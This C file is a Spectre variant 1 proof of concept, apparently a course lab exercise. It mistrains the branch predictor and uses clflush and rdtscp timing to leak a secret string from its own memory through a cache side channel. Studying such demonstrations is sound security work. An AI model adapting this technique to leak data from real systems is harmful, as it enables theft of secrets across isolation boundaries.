#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];
const int shuffle[256] = {119,17,160,183,60,31,82,105,54,188,84,64,73,226,126,107,146,196,34,124,164,157,207,93,173,49,175,184,148,72,15,143,101,42,108,106,187,62,66,170,43,2,61,20,243,200,240,220,223,8,242,22,133,45,232,227,145,26,209,86,228,186,131,215,244,253,224,211,85,52,81,216,4,236,214,178,33,179,127,225,63,83,102,87,46,192,80,114,90,3,185,198,194,205,218,78,30,191,100,237,103,92,202,230,68,234,150,1,193,116,222,67,235,55,153,109,132,88,128,195,208,221,65,35,204,135,44,58,111,32,48,74,77,25,161,147,250,171,10,27,137,59,231,155,70,238,189,210,136,252,174,12,99,254,57,6,159,169,71,18,162,180,201,139,246,95,217,14,181,248,123,144,115,41,21,110,206,53,176,29,24,134,91,140,212,129,28,233,104,79,117,190,120,50,7,5,163,229,125,247,13,219,40,241,36,255,113,19,9,112,245,51,138,23,199,213,118,249,203,154,177,56,172,158,47,130,38,76,197,165,94,39,96,97,239,0,166,11,75,149,98,121,142,122,89,167,251,37,141,152,168,151,182,156,16,69};


char *secret = "The Magic Words are Squeamish Ossifrage.";

// used to prevent the compiler from optimizing out victim_function()
uint8_t temp = 0;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp ^= array2[array1[x] * 512];
  }
}

/**
 * Spectre Attack Function to Read Specific Byte.
 *
 * @param malicious_x The malicious x used to call the victim_function
 *
 * @param values      The two most likely guesses returned by your attack
 *
 * @param scores      The score (larger is better) of the two most likely guesses
 */
void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
  // Specify the threshold
  const int THRESHOLD = 40;

  // Build a table to store the hit time of each block
  int hit_count[256] = {0};

  // declare the total attacks
  const int total_reps = 100;

  // declare training_x and call_x for training local branch predictors
  size_t training_x, call_x;

  // repeat the attack to get higher accuracy
  for (int rep = 0; rep < total_reps; rep++) {

    // 1. Flush the array2 from cache
    //    Also train the global branch predictors
    for (int i = 0; i < 256; i++) {
      _mm_clflush(&array2[i * 512]);
    }
    // wait for clflush to commit
    for (volatile int i = 0; i < 100; i++); 
    // memory fence
    _mm_mfence(); 
 
    
    // 2. Train branch predictors
    training_x = rep % array1_size;
    for (int j = 0; j < 30; j++) {

      // Flush array1_size from cache to delay branch resolution
      _mm_clflush(&array1_size);
      // wait for clflush to commit
      for (volatile int z = 0; z < 100; z++)
      // memory fence
      _mm_mfence();

      // call_x = 1 if (j % 6)== 0, else call_x = 0
      call_x = (-(j % 6) >> 31) + 1;
      call_x = call_x * malicious_x + (1 - call_x) * training_x;
      
      // Call the victim function
      victim_function(call_x);
    }


    // 3. Check each block to see if it's hit
    //    Shuffle the access order to avoid data prefetching
    for (int i = 0; i < 256; i++) {
      volatile unsigned int junk = 0;
      uint64_t s0 = __rdtscp(&junk);
      junk = array2[shuffle[i] * 512];
      uint64_t delta = __rdtscp(&junk) - s0;

      if (delta <= THRESHOLD && shuffle[i] != array1[training_x]) {
        hit_count[shuffle[i]]++;
      }
      
    }

    // 4. Find the two most likely guesses 
    value[0] = (uint8_t) 0;
    score[0] = (uint8_t) 0;
    value[1] = (uint8_t) 0;
    score[1] = (uint8_t) 0;

    for (int i = 0; i < 256; i++) {
      if (hit_count[i] >= score[0]) {
        value[1] = value[0];
        score[1] = score[0];
        value[0] = (uint8_t) i;
        score[0] = hit_count[i];
      }
    }
  }
}

int main(int argc, const char **argv) {
  printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
  size_t malicious_x = (size_t)(secret - (char *)array1); /* read the secret */
  int score[2], len = strlen(secret);
  uint8_t value[2];

  // initialize array2 to make sure it is in its own physical page and
  // not in a copy-on-write zero page
  for (size_t i = 0; i < sizeof(array2); i++)
    array2[i] = 1; 

  int count = 0;
  int total_count = len;
  // attack each byte of the secret, successively
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    attack(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X='%c' score=%d)", value[1],
             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
    printf("\n");
    if (score[0] >= 2 * score[1]) {
      count += 1;
    }
  }
  printf("Successful counts %d/%d", count, total_count);
  return (0);
}

